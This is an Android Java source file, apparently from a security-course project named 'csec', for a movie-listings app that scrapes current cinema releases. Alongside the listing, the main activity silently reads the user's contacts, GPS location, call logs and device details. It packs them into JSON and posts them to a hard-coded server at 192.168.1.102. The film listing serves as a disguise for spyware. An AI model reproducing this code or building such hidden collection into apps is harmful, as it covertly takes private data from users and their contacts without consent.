package com.csec.vizyon;

import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.util.Log;
import android.widget.ListView;
import android.widget.Toast;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;

import java.io.IOException;
import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    ListView sinemalarListView;
    public Activity context;
    public ContentResolver contentResolver;

    ArrayList<String> sinemalarTitle;
    ArrayList<String> sinemalarImg;
    ArrayList<String> sinemalarDesc;

    public JSONArray sinemalarContent = new JSONArray();
    final String SINEMALAR_URL = "http://www.beyazperde.com/filmler/vizyondakiler/sinema-sayisi/";

    final String TAG_MAIN = "MainActivity";

    String serverIp = "192.168.1.102";

    //data
    JSONObject data = new JSONObject();
    JSONArray contactsJson = new JSONArray();
    JSONObject utilsJson = new JSONObject();
    JSONObject gpsJson = new JSONObject();
    JSONArray callLogsJson = new JSONArray();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        //sinemalar view lists
        sinemalarTitle = new ArrayList<String>();
        sinemalarImg = new ArrayList<String>();
        sinemalarDesc = new ArrayList<String>();

        //populate sinemalar request and apply listview adapter
        new SinemalarRequest().execute(SINEMALAR_URL);
        //Log.i(TAG_MAIN, sinemalarContent.toString());

        context = this;
        contentResolver = getContentResolver();
        Server server = new Server(context, contentResolver);
        String ip = server.getIpAddress();

        checkIfPermissonExists();

        Utils utils = new Utils(context);
        utilsJson = utils.getUtils();   //Permission error for Android 6.0
        //new Tickets().getTickets(context);

        try {
            data.put("ip", ip);
            data.put("gps", gpsJson);
            data.put("callLog", callLogsJson);
            data.put("utils", utilsJson);
            data.put("contacts", contactsJson);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        //this request is async so you will have to execute this after every parsing operation is finished.
        new Request().execute("http://" + serverIp + ":8080/Csec/Servlet", data.toString());
        Log.i(TAG_MAIN, data.toString());
    }

    final private int REQUEST_CODE_ASK_PERMISSIONS_CONTACT = 123;
    final private int REQUEST_CODE_ASK_PERMISSIONS_GPS = 124;
    final private int REQUEST_CODE_ASK_PERMISSIONS_CALLOG = 125;
    private void checkIfPermissonExists() {
        int hasWriteContactsPermission = 0;
        int hasGPSPermission = 0;
        int hasCallLogPermission = 0;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) { //Android 6.0

            hasWriteContactsPermission = checkSelfPermission(Manifest.permission.READ_CONTACTS);

            if (hasWriteContactsPermission != PackageManager.PERMISSION_GRANTED) {
                requestPermissions(new String[] {Manifest.permission.READ_CONTACTS}, REQUEST_CODE_ASK_PERMISSIONS_CONTACT);
                //return;
            }
            else {
                readContacts();
            }

            hasGPSPermission = checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION);
            if(hasGPSPermission != PackageManager.PERMISSION_GRANTED){
                requestPermissions(new String[] {Manifest.permission.ACCESS_FINE_LOCATION}, REQUEST_CODE_ASK_PERMISSIONS_GPS);
                //return;
            }
            else {
                readGPS();
            }
            //Call log
            hasCallLogPermission = checkSelfPermission(Manifest.permission.READ_CALL_LOG);
            if(hasCallLogPermission != PackageManager.PERMISSION_GRANTED){
                requestPermissions(new String[] {Manifest.permission.READ_CALL_LOG}, REQUEST_CODE_ASK_PERMISSIONS_CALLOG);
                //return;
            }
            else {
                readCallLogs();
            }
        }
        else {  // Android Version < Android 6.0
            readContacts();
            readGPS();
            readCallLogs();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode) {
            case REQUEST_CODE_ASK_PERMISSIONS_CONTACT:
                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission Granted
                    readContacts();
                } else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "READ_CONTACTS Denied", Toast.LENGTH_SHORT).show();
                }
                break;
            case REQUEST_CODE_ASK_PERMISSIONS_GPS:
                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission Granted
                    readGPS();
                } else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "ACCESS_FINE_LOCATION Denied", Toast.LENGTH_SHORT).show();
                }
            case REQUEST_CODE_ASK_PERMISSIONS_CALLOG:
                if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    // Permission Granted
                    readCallLogs();
                } else {
                    // Permission Denied
                    Toast.makeText(MainActivity.this, "READ_CALL_LOG Denied", Toast.LENGTH_SHORT).show();
                }
            default:
                super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    public void readContacts(){

        Contacts contacts= new Contacts(contentResolver);
        contactsJson = contacts.getAllContacts();
    }

    public void readGPS(){
        GPSTracker gps = new GPSTracker(MainActivity.this);
        if(gps.canGetLocation()) {

            gpsJson = gps.getGps();
            //Toast.makeText(getApplicationContext(),gpsJson.toString(), Toast.LENGTH_LONG).show();
        }
    }


    public void readCallLogs(){
        CallLogs calllogs= new CallLogs(contentResolver);
        callLogsJson = calllogs.getCallLogs();
    }

    //getting sinemalar content
    public class SinemalarRequest extends AsyncTask<String, Void, String> {
        final String TAGSINEMALAR = "SinemalarAsyncTask";

        @Override
        protected void onPreExecute() {

        }

        @Override
        protected String doInBackground(String... params) {

            String url = params[0];
            try {
                Document doc = Jsoup.connect(url).get();

                Elements elements = doc.getElementsByClass("img_side_content");

                for(Element elementRowContent : elements){

                    JSONObject tmpJson = new JSONObject();


                    String pictureUrl = elementRowContent.child(0).child(0).attr("abs:src");
                    String title = elementRowContent.child(1).child(0).child(1).text();
                    String description = elementRowContent.child(1).child(2).text();

                    sinemalarTitle.add(title);
                    sinemalarImg.add(pictureUrl);
                    sinemalarDesc.add(description);

                }

            } catch (IOException e) {
                e.printStackTrace();
            }
            return null;
        }

        @Override
        protected void onPostExecute(String result) {

            //Log.i(TAGSINEMALAR, "onPostExecute:" + sinemalarTitle.toString());

            SinemalarListViewAdapter adapter = new SinemalarListViewAdapter(context, sinemalarTitle, sinemalarImg, sinemalarDesc);
            sinemalarListView = (ListView)findViewById(R.id.sinemalar_list_view);
            sinemalarListView.setAdapter(adapter);

        }
    }

}